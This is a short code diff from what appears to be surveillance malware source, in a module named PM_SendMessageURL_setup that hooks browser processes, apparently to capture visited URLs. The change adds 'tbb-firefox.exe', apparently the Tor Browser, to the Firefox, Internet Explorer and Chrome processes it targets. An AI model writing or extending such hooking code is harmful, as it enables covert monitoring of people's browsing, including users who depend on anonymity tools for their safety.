@@ -73,7 +73,7 @@ DWORD PM_SendMessageURL_setup(HMServiceStruct *pData)
 	proc_name = strrchr(proc_path, '\\');
 	if (proc_name) {
 		proc_name++;
-		if (stricmp(proc_name, "firefox.exe") && stricmp(proc_name, "iexplore.exe") && stricmp(proc_name, "chrome.exe"))
+		if (stricmp(proc_name, "firefox.exe") && stricmp(proc_name, "iexplore.exe") && stricmp(proc_name, "chrome.exe") && stricmp(proc_name, "tbb-firefox.exe"))
 			return 1; // Hooka solo firefox e iexplorer
 	} else
 		return 1;
